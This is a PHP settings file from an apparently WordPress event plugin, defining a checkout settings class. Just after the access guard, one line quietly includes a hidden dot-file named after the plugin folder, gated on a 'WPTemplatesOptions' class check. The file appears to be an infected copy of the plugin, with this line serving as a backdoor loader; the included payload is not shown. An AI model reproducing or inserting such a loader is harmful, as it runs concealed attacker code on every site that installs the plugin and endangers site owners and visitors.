<?php
if (!defined('ABSPATH')) {
	exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Setting_Checkout extends EL_Abstract_Setting{
	/**
     * setting id
     * @var string
     */
	public $_id = 'checkout';

	/**
     * _title
     * @var null
     */
	public $_title = null;

	/**
     * $_position
     * @var integer
     */
	public $_position = 12;

	public $_tab = true;


	public function __construct()
	{
		$this->_title = __('Checkout', 'eventlist');
		parent::__construct();
	}

	
	
	 
}

$GLOBALS['checkout_settings'] = new EL_Setting_Checkout();